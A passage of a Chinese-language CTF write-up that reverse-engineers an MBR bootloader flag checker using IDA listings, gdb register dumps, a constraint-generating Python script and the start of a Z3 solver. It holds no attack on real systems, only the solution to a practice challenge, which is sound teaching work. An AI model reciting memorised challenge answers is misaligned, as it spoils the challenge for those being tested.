xmm5, xmm2</span><br><span class="line">seg000:7C9A                 movaps  xmmword ptr ds:1268h, xmm5</span><br><span class="line">seg000:7C9F                 mov     di, ds:1268h</span><br><span class="line">seg000:7CA3                 shl     edi, 10h</span><br><span class="line">seg000:7CA7                 mov     di, ds:1270h</span><br><span class="line">seg000:7CAB                 mov     dx, si</span><br><span class="line">seg000:7CAD                 dec     dx</span><br><span class="line">seg000:7CAE                 add     dx, dx</span><br><span class="line">seg000:7CB0                 add     dx, dx</span><br><span class="line">seg000:7CB2                 cmp     edi, [edx+7DA8h]</span><br><span class="line">seg000:7CBA                 jnz     loc_7D4D</span><br><span class="line">seg000:7CBE                 dec     si</span><br><span class="line">seg000:7CBF                 test    si, si</span><br><span class="line">seg000:7CC1                 jnz     short loc_7C8E</span><br></pre></td></tr></table></figure><p>程序在输入flag以后, 猜测检查开头是否为flag。如果正确则把后面部分加载入<code>xmm0</code>, 并把<code>loc_7c00</code>处的数据载入<code>xmm5</code>, 然后对<code>xmm0</code>进行<a href="http://www.hgy413.com/hgydocs/IA32/instruct32_hh/vc251.htm">pshufd 压缩双字乱序</a>.</p><p>接下来的操作基本上就是把循环遍历输入字节, 对每个字节执行xmm操作, 并将操作和MBR末尾处的字节序列进行比较。本地的重点就是了解执行了哪些XMM操作。</p><p>每个XMM寄存器长128位, 通常用于快速浮点操作。本题用于flag的混淆。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>我们通过下列指令启动gdb调试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">    -ex <span class="string">&#x27;set architecture i8086&#x27;</span> \</span><br><span class="line">    -ex <span class="string">&#x27;break *0x7c6f&#x27;</span> \</span><br><span class="line">    -ex <span class="string">&#x27;continue&#x27;</span></span><br></pre></td></tr></table></figure><p>这里四条指令的意思分别是: 连接调试端口, 设置指令集架构, 在0x7c6f处(<code>cmp     dword ptr ds:1234h, &#39;galf&#39;</code>)下断点以及程序继续运行。</p><p>我们输入开头为<code>flag</code>的字符串, 如<code>flag&#123;12345678912345&#125;</code></p><p>输入后我们执行到<code>movaps  xmm0, xmmword ptr ds:1238h</code>, 既为地址<code>0x7C7C</code>执行后查看<code>xmm0</code>, 即为我们输入的值</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$xmm0</span></span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line"> .....</span><br><span class="line">  uint128 = 0x7d35343332313938373635343332317b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们输入的结果, 继续执行过<code>movaps  xmm5, xmmword ptr ds:loc_7C00</code>, 查看<code>xmm5</code>的值</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$xmm5</span></span><br><span class="line"><span class="variable">$3</span> = &#123;</span><br><span class="line">.....</span><br><span class="line">  uint128 = 0x220f02c883fbe083c0200f10cd0013b8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过<code>pshufd  xmm0, xmm0, 1Eh</code>查看结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$xmm0</span></span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line"> .....</span><br><span class="line">  uint128 = 0x3332317b373635347d35343332313938</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比原结果可以认为进行了循环移位的操作。</p><p>接下来进入一个循环:</p><ol><li><p>首先将<a href="https://github.com/TechSecCTF/writeups/blob/70fedf363d08acc7c5b9bf3d3d5c1ef53dce0636/CSAWQuals2017/realism/realism.ida#L177">掩码</a>作用于输入（<code>0x7c91</code>）</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  x/2x (<span class="variable">$esi</span>+0x7d90)</span><br><span class="line">0x7d98:    0xffffffffffffff00    0xffffffffffffff00</span><br></pre></td></tr></table></figure><p> 执行<code>andps   xmm2, xmmword ptr [si+7D90h]</code>后查看<code>xmm2</code>的值</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$xmm2</span></span><br><span class="line"><span class="variable">$9</span> = &#123;</span><br><span class="line">  uint128 = 0x3332317b373635007d35343332313900</span><br><span class="line">&#125;</span><br><span class="line">// 这里对比原来0x3332317b373635347d35343332313938可以发现第7位字节和第15位字节被与为0</span><br></pre></td></tr></table></figure><p> 查看<code>0x7D90</code>的值:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:7D90                 dd 0FFFFFFFFh</span><br><span class="line">seg000:7D94                 dd 0FFFFFFFFh</span><br><span class="line">seg000:7D98                 dd 0FFFFFF00h</span><br><span class="line">seg000:7D9C                 dd 0FFFFFFFFh</span><br><span class="line">seg000:7DA0                 dd 0FFFFFF00h</span><br><span class="line">seg000:7DA4                 dd 0FFFFFFFFh</span><br></pre></td></tr></table></figure></li><li><p>计算常量数据和操作后的输入之间的“<a href="http://www.hgy413.com/hgydocs/IA32/instruct32_hh/vc250.htm">psadbw  绝对差值之和</a>”, 更新<code>xmm5</code>的值（<code>0x7c96</code>）</p><p> 执行<code>psadbw  xmm5, xmm2</code>后<code>xmm5</code>的值</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$xmm5</span></span><br><span class="line"><span class="variable">$10</span> = &#123;</span><br><span class="line">......</span><br><span class="line">  v2_int64 = &#123;0x24a, 0x2ef&#125;,      uint128 = 0x2ef000000000000024a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 根据上述链接查看<code>psadbw</code>意义:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PSADBW instructions when using 128-bit operands:</span><br><span class="line">TEMP0  ABS(DEST[7-0] - SRC[7-0]);</span><br><span class="line">* repeat operation for bytes 2 through 14 *;</span><br><span class="line">TEMP15  ABS(DEST[127-120] - SRC[127-120]);</span><br><span class="line">DEST[15-0]  SUM(TEMP0...TEMP7);</span><br><span class="line">DEST[63-6]  000000000000H;</span><br><span class="line">DEST[79-64]  SUM(TEMP8...TEMP15);</span><br><span class="line">DEST[127-80]  000000000000H;</span><br></pre></td></tr></table></figure><p> 因此根据<code>xmm5</code>原值<code>0x220f02c883fbe083c0200f10cd0013b8</code>可以知道有如下等式, a[x]表示第x位字节:</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0x22</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0x0f</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-x0x02) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0xc8</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0x83</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0xfb</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">0xe0</span>) + <span class="built_in">abs</span>(<span class="number">0</span> - <span class="number">0x83</span>) = <span class="number">0x2ef</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0xc0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0x20</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0x0f</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0x10</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0xcd</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0x00</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">0x13</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0xb8</span>)  = <span class="number">0x24a</span></span><br></pre></td></tr></table></figure></li><li><p>接着把结果的高低位存入EDI(<code>0x7c9a-0x7ca7</code>)</p><p> 我们直接跳到<code>0x7cab</code>, 查看<code>edi</code>的值</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$edi</span></span><br><span class="line"><span class="variable">$12</span> = 0x24a02ef</span><br></pre></td></tr></table></figure></li><li><p>对比EDI和常量数据(<code>0x7cb2</code>)</p><p> <code>0x7cab-0x7CB0</code>都是寻址操作可以不理, 我们直接跳到<code>0x7cb2</code></p><p> 查看此时<code>[edx+7DA8h]</code>的值</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  x/x <span class="variable">$edx</span>+0x7da8</span><br><span class="line">0x7dc4:    0x03110304</span><br></pre></td></tr></table></figure><p> 我们到IDA中对应位置查看, 刚好可以发现一堆常数</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:7DA8                 dd 2DD02F6h</span><br><span class="line">seg000:7DAC                 dd 2DC02E8h</span><br><span class="line">seg000:7DB0                 dd 2D802EDh</span><br><span class="line">seg000:7DB4                 dd 2CE02E2h</span><br><span class="line">seg000:7DB8                 dd 2C402E2h</span><br><span class="line">seg000:7DBC                 dd 2D402DBh</span><br><span class="line">seg000:7DC0                 dd 2D902CDh</span><br><span class="line">seg000:7DC4                 dd 3110304h</span><br></pre></td></tr></table></figure></li><li><p>到这里我们可以知道这次循环要求的是</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0x22</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0x0f</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-x0x02) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0xc8</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0x83</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0xfb</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">0xe0</span>) + <span class="built_in">abs</span>(<span class="number">0</span> - <span class="number">0x83</span>) = <span class="number">0x304</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0xc0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0x20</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0x0f</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0x10</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0xcd</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0x00</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">0x13</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0xb8</span>)  = <span class="number">0x311</span></span><br></pre></td></tr></table></figure><p> 常数从<code>0x7DC4</code>对比至<code>0x7DA8</code></p></li><li><p>计数器减一并返回, 查看是否还有更多字节要检查</p></li></ol><p>此时查看<code>si</code>值</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p <span class="variable">$si</span></span><br><span class="line"><span class="variable">$16</span> = 0x8</span><br></pre></td></tr></table></figure><p>根据接下来的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:7CBE                 dec     si</span><br><span class="line">seg000:7CBF                 test    si, si</span><br><span class="line">seg000:7CC1                 jnz     short loc_7C8E ; 这里刚好是我们循环开始的地址</span><br></pre></td></tr></table></figure><p>从而可知这种循环一共执行8次, 根据前面我们查看的<code>0x7D90</code>的值, 可以理解循环每次与成0的输入位分别从<code>[7-&gt;0]</code>和<code>[15-&gt;8]</code></p><h3 id="Z3求解"><a href="#Z3求解" class="headerlink" title="Z3求解"></a>Z3求解</h3><p>我们可以将输入的每个字节看作单独的变量, 从<code>a[0]</code>到<code>a[15]</code>由于步骤2指令的性质, 每次循环都给我们提供了两个方程, 因此我们一共拥有<code>2 * 8 = 16 个方程</code>从而可以求解出这16个变量的结果</p><p>虽然结果设计绝对值, 即它是非线性的, 但这并不影响我们使用求解器<a href="https://github.com/Z3Prover/z3">Z3</a>求解其结果</p><p>我们先用python模拟出他的结果, 这里我们照着wp改常数就可以了, 当然理解了流程的我们也可以完全可以自己编写了, 这里修改输出方便我们直接贴到第二个解题脚本中进行Z3求解:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial value of xmm5</span></span><br><span class="line">xmm5_start = binascii.unhexlify(<span class="string">&#x27;220f02c883fbe083c0200f10cd0013b8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The data stored at 0x7DA8 and compared against esi</span></span><br><span class="line">esi_consts = [</span><br><span class="line">                <span class="string">&#x27;f602dd02&#x27;</span>,                <span class="string">&#x27;e802dc02&#x27;</span>,                <span class="string">&#x27;ed02d802&#x27;</span>,                <span class="string">&#x27;e202ce02&#x27;</span>,                <span class="string">&#x27;e202c402&#x27;</span>,                <span class="string">&#x27;db02d402&#x27;</span>,                <span class="string">&#x27;cd02d902&#x27;</span>,                <span class="string">&#x27;04031103&#x27;</span>,              ]</span><br><span class="line">esi_consts = [struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, binascii.unhexlify(c))[<span class="number">0</span>] <span class="keyword">for</span> c <span class="keyword">in</span> esi_consts]</span><br><span class="line">esi_consts = esi_consts[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Our 16 variables (&#x27;a[0]&#x27; through &#x27;a[15]&#x27;)</span></span><br><span class="line">variables = [(<span class="string">&quot;a[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">esi_to_xmm5</span>(<span class="params">esi</span>):</span></span><br><span class="line">  s1 = esi % (<span class="number">1</span> &lt;&lt; <span class="number">0x10</span>)</span><br><span class="line">  s2 = (esi - s1) &gt;&gt; (<span class="number">0x10</span>)</span><br><span class="line">  w = struct.pack(<span class="string">&#x27;&gt;Q&#x27;</span>, s1) + struct.pack(<span class="string">&#x27;&gt;Q&#x27;</span>, s2)</span><br><span class="line">  <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_constraints</span>():</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    prev_esi = esi_consts[i-<span class="number">1</span>]</span><br><span class="line">    xmm5 = esi_to_xmm5(prev_esi)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">      xmm5 = xmm5_start</span><br><span class="line"></span><br><span class="line">    esi = esi_consts[i]</span><br><span class="line">    s1 = esi % (<span class="number">1</span> &lt;&lt; <span class="number">0x10</span>)</span><br><span class="line">    s2 = (esi - s1) &gt;&gt; (<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sum of absolute differences between xmm5 and our flag</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">      <span class="keyword">if</span> j == <span class="number">7</span>-i:</span><br><span class="line">        <span class="comment"># This is the masking step</span></span><br><span class="line">        s += <span class="string">&#x27;abs(0-&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(xmm5[j])) + <span class="string">&#x27;) + &#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      s += <span class="string">&#x27;abs(&#x27;</span> + variables[j] + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(xmm5[j])) + <span class="string">&#x27;) + &#x27;</span></span><br><span class="line">    s += <span class="string">&#x27;0 == &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;s.add(&quot;</span> + s + <span class="string">&quot;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">16</span>):</span><br><span class="line">      <span class="keyword">if</span> j-<span class="number">8</span> == <span class="number">7</span>-i:</span><br><span class="line">        <span class="comment"># This is the masking step</span></span><br><span class="line">        s += <span class="string">&#x27;abs(0-&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(xmm5[j])) + <span class="string">&#x27;) + &#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      s += <span class="string">&#x27;abs(&#x27;</span> + variables[j] + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(xmm5[j])) + <span class="string">&#x27;) + &#x27;</span></span><br><span class="line">    s += <span class="string">&#x27;0 == &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;s.add(&quot;</span> + s + <span class="string">&quot;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  print_constraints()</span><br></pre></td></tr></table></figure><p>得到输出:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">34</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">15</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">200</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">131</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">251</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">224</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">131</span>) + <span class="number">0</span> == <span class="number">772</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">192</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">32</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">15</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">16</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">205</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">19</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">184</span>) + <span class="number">0</span> == <span class="number">785</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">3</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">4</span>) + <span class="number">0</span> == <span class="number">717</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">3</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">17</span>) + <span class="number">0</span> == <span class="number">729</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">205</span>) + <span class="number">0</span> == <span class="number">731</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">217</span>) + <span class="number">0</span> == <span class="number">724</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">219</span>) + <span class="number">0</span> == <span class="number">738</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">212</span>) + <span class="number">0</span> == <span class="number">708</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">226</span>) + <span class="number">0</span> == <span class="number">738</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">196</span>) + <span class="number">0</span> == <span class="number">718</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">226</span>) + <span class="number">0</span> == <span class="number">749</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">206</span>) + <span class="number">0</span> == <span class="number">728</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">0</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">237</span>) + <span class="number">0</span> == <span class="number">744</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(a[<span class="number">8</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">216</span>) + <span class="number">0</span> == <span class="number">732</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">1</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">2</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">3</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">4</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">5</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">6</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">7</span>]-<span class="number">232</span>) + <span class="number">0</span> == <span class="number">758</span>)</span><br><span class="line">s.add(<span class="built_in">abs</span>(<span class="number">0</span>-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">9</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">10</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">11</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">12</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">13</span>]-<span class="number">0</span>) + <span class="built_in">abs</span>(a[<span class="number">14</span>]-<span class="number">2</span>) + <span class="built_in">abs</span>(a[<span class="number">15</span>]-<span class="number">220</span>) + <span class="number">0</span> == <span class="number">733</span>)</span><br></pre></td></tr></table></figure><p>z3求解脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">abs</span>(<span class="params">x</span>):</span></span><br><span class="line">  <span class="keyword">return</span> If(x &gt;= <span class="number">0</span>, x, -x)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a = IntVector(<span class="string">&#x27;x&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把上面的贴下来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s.add(a[i] &gt;= <span 